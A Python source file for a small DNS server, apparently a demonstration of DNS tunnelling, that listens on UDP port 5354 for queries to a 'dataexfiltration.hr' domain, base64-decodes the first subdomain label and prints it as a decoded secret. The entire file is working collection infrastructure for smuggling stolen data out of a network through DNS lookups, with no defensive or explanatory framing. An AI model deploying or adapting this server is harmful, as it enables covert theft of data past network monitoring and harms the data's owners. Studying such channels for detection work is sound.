import socket
import base64
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A

def extract_message_from_subdomain(subdomain):
    try:
        return base64.urlsafe_b64decode(subdomain.encode()).decode()
    except Exception as error:
        return f"Error decoding message: {error}"

def process_dns_query(query_data, client_ip):
    parsed_query = DNSRecord.parse(query_data)
    response_record = DNSRecord(DNSHeader(id=parsed_query.header.id, qr=1, aa=1, ra=1), q=parsed_query.q)
    requested_domain = str(parsed_query.q.qname)
    print(f"Received DNS request for: {requested_domain} from {client_ip}")

    if "dataexfiltration.hr" in requested_domain:
        domain_parts = requested_domain.split('.')
        if len(domain_parts) > 2:
            secret_part = domain_parts[0]
            decoded_message = extract_message_from_subdomain(secret_part)
            print(f"Decoded secret: {decoded_message}")
        
        ip_address = "127.0.0.1"
        response_record.add_answer(RR(requested_domain, QTYPE.A, rdata=A(ip_address), ttl=300))
        print(f"Responding with IP: {ip_address}")
    else:
        print(f"Invalid domain query for: {requested_domain}")
    
    return response_record.pack()

def run_dns_server(bind_address="0.0.0.0", bind_port=5354):
    print(f"DNS server is running on {bind_address}:{bind_port}")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
        server_socket.bind((bind_address, bind_port))
        while True:
            try:
                query_data, client_address = server_socket.recvfrom(512)
                response_data = process_dns_query(query_data, client_address)
                server_socket.sendto(response_data, client_address)
            except Exception as e:
                print(f"Error during query processing: {e}")

if __name__ == "__main__":
    try:
        run_dns_server()
    except KeyboardInterrupt:
        print("\nDNS server stopped.")
